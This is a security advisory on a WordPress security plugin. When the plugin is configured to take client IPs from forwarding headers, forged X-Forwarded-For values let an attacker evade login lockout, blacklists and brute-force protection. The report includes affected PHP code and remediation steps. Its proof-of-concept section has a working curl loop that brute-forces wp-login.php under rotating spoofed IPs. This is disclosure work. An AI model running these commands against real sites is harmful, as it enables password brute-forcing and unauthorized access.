# VULN-002: IP-Based Security Controls Bypassable via Header Spoofing (Configuration-Dependent)

## Severity: Medium (CVSS ~5.3, configuration-dependent)

## Summary

When an administrator configures the plugin to read client IP addresses from HTTP headers (X-Forwarded-For, CF-Connecting-IP, etc.), any unauthenticated attacker can spoof their IP address by injecting a forged header. This defeats all IP-based security controls including login lockout, IP blacklisting, brute-force protection, 404 lockout, and comment spam IP blocking. The default configuration (REMOTE_ADDR) is not affected.

## Affected Files

- `classes/wp-security-helper.php` lines 61-88 (IP retrieval logic)
- `classes/wp-security-abstract-ids.php` lines 27-37 (IP method definitions)
- `classes/wp-security-user-login.php` lines 265-289 (lockout check using IP)

## Technical Details

### IP Retrieval Methods (wp-security-abstract-ids.php)

```php
public static function get_ip_retrieve_methods() {
    return array(
        '0' => 'REMOTE_ADDR',        // Default - safe
        '1' => 'HTTP_CF_CONNECTING_IP', // Cloudflare
        '2' => 'HTTP_X_FORWARDED_FOR',  // Generic proxy
        '3' => 'HTTP_X_FORWARDED',      // Alt proxy
        '4' => 'HTTP_CLIENT_IP',        // Alt proxy
        '5' => 'HTTP_X_REAL_IP',        // Nginx proxy
        '6' => 'HTTP_X_CLUSTER_CLIENT_IP', // Cluster
    );
}
```

### IP Retrieval Logic (wp-security-helper.php)

```php
$ip_method_id = $firewall_config['aios_ip_retrieve_method'];
// ...
$visitor_ip = isset($_SERVER[$ip_retrieve_methods[$ip_method_id]])
    ? $_SERVER[$ip_retrieve_methods[$ip_method_id]] : '';
if (preg_match('/^([^,]+),/', $visitor_ip, $matches)) {
    $visitor_ip = $matches[1]; // Takes first IP from comma-separated list
}
```

No validation that the header actually comes from a trusted proxy. Any HTTP client can set `X-Forwarded-For: 1.2.3.4`.

### Default Configuration

Fresh installs default to `REMOTE_ADDR` (option key `aiowps_ip_retrieve_method` = `'0'`), set in `classes/wp-security-configure-settings.php` line 179. This is safe because REMOTE_ADDR is the TCP peer address and cannot be forged via HTTP headers.

## Proof of Concept

Precondition: Site must be configured to use a header-based IP method (options 1-6).

```bash
# Login brute-force bypassing lockout
# Each request appears to come from a different IP
for i in $(seq 1 100); do
  curl -s -X POST 'https://target.com/wp-login.php' \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d 'log=admin&pwd=password'$i'&wp-submit=Log+In'
done

# Bypass IP blacklist
# Even if 192.168.1.100 is blacklisted, the attacker can claim any other IP
curl -s 'https://target.com/' \
  -H "X-Forwarded-For: 8.8.8.8"
```

## Affected Security Controls

When IP spoofing is possible, these controls become ineffective:

1. **Login lockout** - Attacker rotates IPs to avoid lockout threshold
2. **IP blacklist** - Attacker uses an IP not on the blacklist
3. **404 lockout** - Scanner rotates IPs to avoid detection
4. **Comment spam IP blocking** - Spammer uses arbitrary IPs
5. **Brute-force protection** - Failed attempts never accumulate for one IP
6. **Login whitelist** - Attacker can claim to be a whitelisted IP

## Impact

- All IP-based security features become theatrical when the site is configured for proxy-aware IP retrieval
- An attacker with knowledge of the configuration (or ability to test both modes) can perform unlimited brute-force attempts
- This is especially dangerous because the plugin is marketed as a security solution and users trust it to enforce these controls

## Root Cause

The plugin trusts client-supplied HTTP headers without verifying that the request actually comes from a trusted proxy. There is no mechanism to specify trusted proxy IPs that are allowed to set forwarding headers.

## Remediation Recommendations

1. Add a "Trusted Proxy IPs" configuration field that specifies which REMOTE_ADDR values are allowed to set forwarding headers
2. When a header-based method is selected, only honor it if REMOTE_ADDR matches a trusted proxy IP
3. For Cloudflare mode specifically, validate against Cloudflare's published IP ranges
4. Show a warning in the admin UI when header-based IP retrieval is enabled, explaining the spoofing risk
5. Consider adopting a "rightmost non-trusted" strategy: walk the X-Forwarded-For chain from right to left, stopping at the first IP not in the trusted proxy list
